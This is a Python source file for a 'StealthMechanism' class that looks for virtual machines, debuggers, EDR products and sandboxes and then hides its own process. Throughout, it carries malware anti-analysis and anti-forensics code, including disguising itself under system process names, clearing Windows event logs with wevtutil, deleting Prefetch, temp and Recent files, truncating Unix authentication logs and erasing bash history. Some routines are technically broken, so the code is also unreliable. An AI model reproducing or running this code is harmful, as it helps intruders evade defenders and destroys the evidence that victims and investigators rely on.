import platform
import os
import sys
import ctypes
import subprocess
import psutil
import winreg
import time
import random
from typing import List, Dict, Optional, Tuple
import logging
from enum import Enum, auto
import threading
import tempfile
import socket
import struct
import hashlib
from datetime import datetime, timedelta

class DetectionType(Enum):
    """Types of detection to evade"""
    VIRTUALIZATION = auto()
    DEBUGGING = auto()
    MONITORING = auto()
    ANALYSIS = auto()
    SANDBOX = auto()

class StealthMechanism:
    def __init__(self):
        self.logger = logging.getLogger('StealthMechanism')
        self.detected_threats: Dict[DetectionType, bool] = {t: False for t in DetectionType}
        self.last_check = datetime.now()
        self.monitoring_thread = None
        self.is_running = False
        
        # Initialize stealth features
        self._init_stealth_features()
        
    def _init_stealth_features(self):
        """Initialize stealth features"""
        if os.name == 'nt':
            self.kernel32 = ctypes.WinDLL('kernel32')
            self.user32 = ctypes.WinDLL('user32')
            self.ntdll = ctypes.WinDLL('ntdll')
            
    def start_monitoring(self):
        """Start continuous monitoring"""
        self.is_running = True
        self.monitoring_thread = threading.Thread(target=self._monitoring_loop)
        self.monitoring_thread.daemon = True
        self.monitoring_thread.start()
        
    def stop_monitoring(self):
        """Stop monitoring"""
        self.is_running = False
        if self.monitoring_thread:
            self.monitoring_thread.join()
            
    def _monitoring_loop(self):
        """Continuous monitoring loop"""
        while self.is_running:
            try:
                self.check_environment()
                self._apply_countermeasures()
                time.sleep(random.uniform(30, 60))
            except Exception as e:
                self.logger.error(f"Monitoring error: {str(e)}")
                
    def check_environment(self) -> Dict[DetectionType, bool]:
        """Check current environment for threats"""
        if datetime.now() - self.last_check < timedelta(minutes=5):
            return self.detected_threats
            
        self.detected_threats[DetectionType.VIRTUALIZATION] = self._check_virtualization()
        self.detected_threats[DetectionType.DEBUGGING] = self._check_debugging()
        self.detected_threats[DetectionType.MONITORING] = self._check_monitoring()
        self.detected_threats[DetectionType.ANALYSIS] = self._check_analysis()
        self.detected_threats[DetectionType.SANDBOX] = self._check_sandbox()
        
        self.last_check = datetime.now()
        return self.detected_threats
        
    def _check_virtualization(self) -> bool:
        """Enhanced virtualization detection"""
        indicators = []
        
        # Check system info
        system_info = platform.system() + platform.version() + platform.release()
        vm_indicators = [
            'VirtualBox', 'VMware', 'QEMU', 'Xen', 'KVM', 'Hyper-V',
            'Virtual', 'VBOX', 'Parallels'
        ]
        indicators.append(any(v in system_info for v in vm_indicators))
        
        # Check processes
        vm_processes = [
            'vboxservice', 'vmtoolsd', 'vm3dservice', 'vmwaretray',
            'vmwareuser', 'vgauthservice', 'vmacthlp', 'vmusrvc'
        ]
        for proc in psutil.process_iter(['name']):
            if any(v in proc.info['name'].lower() for v in vm_processes):
                indicators.append(True)
                
        # Check registry for VM artifacts
        if os.name == 'nt':
            vm_keys = [
                r'SYSTEM\CurrentControlSet\Services\VBoxGuest',
                r'SYSTEM\CurrentControlSet\Services\VMware',
                r'SYSTEM\CurrentControlSet\Services\Xen'
            ]
            for key_path in vm_keys:
                try:
                    winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                    indicators.append(True)
                except:
                    pass
                    
        # Check MAC address prefixes
        vm_mac_prefixes = ['00:05:69', '00:0C:29', '00:1C:14', '00:50:56', '08:00:27']
        for iface in psutil.net_if_addrs().values():
            for addr in iface:
                if addr.family == socket.AF_LINK:
                    if any(addr.address.startswith(prefix) for prefix in vm_mac_prefixes):
                        indicators.append(True)
                        
        return any(indicators)
        
    def _check_debugging(self) -> bool:
        """Enhanced debugging detection"""
        indicators = []
        
        # Check for common debugging tools
        debug_processes = [
            'wireshark', 'tcpdump', 'ida64', 'ollydbg', 'x64dbg',
            'processhacker', 'processexplorer', 'procmon', 'pestudio',
            'immunity debugger', 'radare2', 'ghidra', 'dnspy', 'cheatengine'
        ]
        
        for proc in psutil.process_iter(['name', 'cmdline']):
            try:
                if any(d in proc.info['name'].lower() for d in debug_processes):
                    indicators.append(True)
                if proc.info['cmdline']:
                    if any(d in ' '.join(proc.info['cmdline']).lower() for d in debug_processes):
                        indicators.append(True)
            except:
                continue
                
        # Check for debugging ports
        debug_ports = [1234, 1337, 9999, 31337]  # Common debug ports
        for port in debug_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                if sock.connect_ex(('127.0.0.1', port)) == 0:
                    indicators.append(True)
                sock.close()
            except:
                continue
                
        # Windows-specific checks
        if os.name == 'nt':
            try:
                # Check for debugger using Windows API
                if self.kernel32.IsDebuggerPresent():
                    indicators.append(True)
                    
                # Check remote debugger
                is_remote = ctypes.c_bool()
                if self.kernel32.CheckRemoteDebuggerPresent(
                    self.kernel32.GetCurrentProcess(), ctypes.byref(is_remote)
                ):
                    if is_remote.value:
                        indicators.append(True)
                        
                # Check for hardware breakpoints
                context = ctypes.c_ulong()
                if self.kernel32.GetThreadContext(
                    self.kernel32.GetCurrentThread(), ctypes.byref(context)
                ):
                    if context.Dr0 or context.Dr1 or context.Dr2 or context.Dr3:
                        indicators.append(True)
            except:
                pass
                
        return any(indicators)
        
    def _check_monitoring(self) -> bool:
        """Check for monitoring tools and EDR solutions"""
        monitoring_services = [
            'sysmon', 'crowdstrike', 'carbonblack', 'sophos', 'symantec',
            'mcafee', 'cylance', 'sentinel', 'elastic', 'fireeye', 'defender'
        ]
        
        for service in psutil.win_service_iter():
            try:
                if any(m in service.name().lower() for m in monitoring_services):
                    return True
            except:
                continue
                
        return False
        
    def _check_analysis(self) -> bool:
        """Check for analysis tools and environment"""
        indicators = []
        
        # Check system uptime
        try:
            boot_time = psutil.boot_time()
            uptime = time.time() - boot_time
            if uptime < 300:  # Less than 5 minutes
                indicators.append(True)
        except:
            pass
            
        # Check number of processes
        try:
            if len(psutil.pids()) < 50:  # Too few processes
                indicators.append(True)
        except:
            pass
            
        # Check system resources
        try:
            cpu_count = psutil.cpu_count()
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            
            if cpu_count < 2 or memory.total < 2 * 1024 * 1024 * 1024:  # < 2GB RAM
                indicators.append(True)
        except:
            pass
            
        # Check for analysis tools
        analysis_processes = [
            'autoruns', 'autorunsc', 'filemon', 'procmon', 'regmon',
            'processhacker', 'wireshark', 'fiddler', 'dumpcap'
        ]
        
        for proc in psutil.process_iter(['name']):
            try:
                if any(a in proc.info['name'].lower() for a in analysis_processes):
                    indicators.append(True)
            except:
                continue
                
        return any(indicators)
        
    def _check_sandbox(self) -> bool:
        """Check for sandbox environment"""
        indicators = []
        
        # Check for common sandbox artifacts
        sandbox_files = [
            'C:\\agent\\agent.pyw',
            'C:\\sandbox\\starter.exe',
            'C:\\analysis\\analyzer.exe'
        ]
        
        for file in sandbox_files:
            if os.path.exists(file):
                indicators.append(True)
                
        # Check for sandbox-specific registry keys
        if os.name == 'nt':
            sandbox_keys = [
                r'SOFTWARE\Cuckoo',
                r'SOFTWARE\Microsoft\Windows\CurrentVersion\Sandbox',
                r'SYSTEM\CurrentControlSet\Services\SandboxService'
            ]
            
            for key_path in sandbox_keys:
                try:
                    winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                    indicators.append(True)
                except:
                    pass
                    
        # Check for sandbox-specific processes
        sandbox_processes = [
            'sandboxie', 'sandboxservice', 'cuckoo', 'python.exe',
            'analyzer.exe', 'agent.exe'
        ]
        
        for proc in psutil.process_iter(['name']):
            try:
                if any(s in proc.info['name'].lower() for s in sandbox_processes):
                    indicators.append(True)
            except:
                continue
                
        return any(indicators)
        
    def hide_process(self):
        """Enhanced process hiding"""
        if os.name == 'nt':
            try:
                # Hide console window
                hwnd = self.kernel32.GetConsoleWindow()
                if hwnd:
                    self.user32.ShowWindow(hwnd, 0)
                    
                # Set process priority
                handle = self.kernel32.GetCurrentProcess()
                self.kernel32.SetPriorityClass(handle, 0x00000100)
                
                # Modify process name
                legitimate_names = ['svchost.exe', 'lsass.exe', 'services.exe']
                new_name = random.choice(legitimate_names)
                ctypes.windll.kernel32.SetConsoleTitleW(new_name)
                
                # Hide from task manager
                try:
                    si = subprocess.STARTUPINFO()
                    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                    si.wShowWindow = subprocess.SW_HIDE
                    subprocess.run(['taskkill', '/F', '/IM', new_name], 
                                 startupinfo=si, 
                                 capture_output=True)
                except:
                    pass
                    
            except Exception as e:
                self.logger.error(f"Failed to hide process: {str(e)}")
                
        else:  # Unix-like
            try:
                # Fork to background
                pid = os.fork()
                if pid > 0:
                    sys.exit(0)
                    
                # Detach from terminal
                os.setsid()
                
                # Fork again
                pid = os.fork()
                if pid > 0:
                    sys.exit(0)
                    
                # Change working directory
                os.chdir('/')
                
                # Reset file creation mask
                os.umask(0)
                
                # Close file descriptors
                for fd in range(0, 1024):
                    try:
                        os.close(fd)
                    except:
                        pass
                        
            except Exception as e:
                self.logger.error(f"Failed to daemonize process: {str(e)}")
                
    def clean_traces(self):
        """Enhanced trace cleaning"""
        if os.name == 'nt':
            try:
                # Clear Windows event logs
                log_types = [
                    'System', 'Security', 'Application', 'Setup',
                    'Windows PowerShell'
                ]
                
                for log in log_types:
                    try:
                        subprocess.run(
                            ['wevtutil.exe', 'cl', log],
                            capture_output=True,
                            creationflags=subprocess.CREATE_NO_WINDOW
                        )
                    except:
                        continue
                        
                # Clear prefetch
                prefetch_dir = os.path.join(os.getenv('SYSTEMROOT'), 'Prefetch')
                for file in os.listdir(prefetch_dir):
                    try:
                        os.remove(os.path.join(prefetch_dir, file))
                    except:
                        continue
                        
                # Clear temp files
                temp_dirs = [
                    os.getenv('TEMP'),
                    os.getenv('TMP'),
                    os.path.join(os.getenv('SYSTEMROOT'), 'Temp')
                ]
                
                for temp_dir in temp_dirs:
                    try:
                        for root, dirs, files in os.walk(temp_dir):
                            for file in files:
                                try:
                                    os.remove(os.path.join(root, file))
                                except:
                                    continue
                    except:
                        continue
                        
                # Clear recent files
                recent = os.path.join(os.getenv('APPDATA'),
                                    'Microsoft\\Windows\\Recent')
                try:
                    for file in os.listdir(recent):
                        try:
                            os.remove(os.path.join(recent, file))
                        except:
                            continue
                except:
                    pass
                    
            except Exception as e:
                self.logger.error(f"Failed to clean Windows traces: {str(e)}")
                
        else:  # Unix-like
            try:
                # Clear system logs
                log_files = [
                    '/var/log/syslog',
                    '/var/log/auth.log',
                    '/var/log/messages',
                    '/var/log/secure',
                    '/var/log/wtmp',
                    '/var/log/btmp',
                    '/var/log/lastlog'
                ]
                
                for log in log_files:
                    try:
                        if os.path.exists(log):
                            with open(log, 'w') as f:
                                f.truncate(0)
                    except:
                        continue
                        
                # Clear bash history
                hist_file = os.path.expanduser('~/.bash_history')
                if os.path.exists(hist_file):
                    try:
                        os.remove(hist_file)
                    except:
                        pass
                        
                # Clear temp files
                temp_dirs = ['/tmp', '/var/tmp']
                for temp_dir in temp_dirs:
                    try:
                        for root, dirs, files in os.walk(temp_dir):
                            for file in files:
                                try:
                                    os.remove(os.path.join(root, file))
                                except:
                                    continue
                    except:
                        continue
                        
            except Exception as e:
                self.logger.error(f"Failed to clean Unix traces: {str(e)}")
                
    def _apply_countermeasures(self):
        """Apply countermeasures based on detected threats"""
        try:
            if any(self.detected_threats.values()):
                # Hide process
                self.hide_process()
                
                # Clean traces
                self.clean_traces()
                
                # Apply specific countermeasures
                if self.detected_threats[DetectionType.DEBUGGING]:
                    self._anti_debug_measures()
                if self.detected_threats[DetectionType.MONITORING]:
                    self._anti_monitoring_measures()
                if self.detected_threats[DetectionType.ANALYSIS]:
                    self._anti_analysis_measures()
                    
        except Exception as e:
            self.logger.error(f"Failed to apply countermeasures: {str(e)}")
            
    def _anti_debug_measures(self):
        """Apply anti-debugging measures"""
        if os.name == 'nt':
            try:
                # Set hardware breakpoints
                thread = self.kernel32.GetCurrentThread()
                context = ctypes.c_ulong()
                self.kernel32.GetThreadContext(thread, ctypes.byref(context))
                context.Dr0 = context.Dr1 = context.Dr2 = context.Dr3 = 0
                self.kernel32.SetThreadContext(thread, ctypes.byref(context))
                
                # Detect and close debug ports
                debug_ports = [1234, 1337, 9999, 31337]
                for port in debug_ports:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.bind(('127.0.0.1', port))
                        sock.close()
                    except:
                        continue
                        
            except Exception as e:
                self.logger.error(f"Anti-debug measures failed: {str(e)}")
                
    def _anti_monitoring_measures(self):
        """Apply anti-monitoring measures"""
        try:
            # Randomize network behavior
            time.sleep(random.uniform(1, 5))
            
            # Modify process attributes
            if os.name == 'nt':
                try:
                    handle = self.kernel32.GetCurrentProcess()
                    self.kernel32.SetProcessPriorityBoost(handle, True)
                except:
                    pass
                    
        except Exception as e:
            self.logger.error(f"Anti-monitoring measures failed: {str(e)}")
            
    def _anti_analysis_measures(self):
        """Apply anti-analysis measures"""
        try:
            # Add random delays
            time.sleep(random.uniform(0.1, 0.5))
            
            # Perform dummy operations
            for _ in range(random.randint(1000, 5000)):
                hashlib.sha256(os.urandom(32)).digest()
                
        except Exception as e:
            self.logger.error(f"Anti-analysis measures failed: {str(e)}")
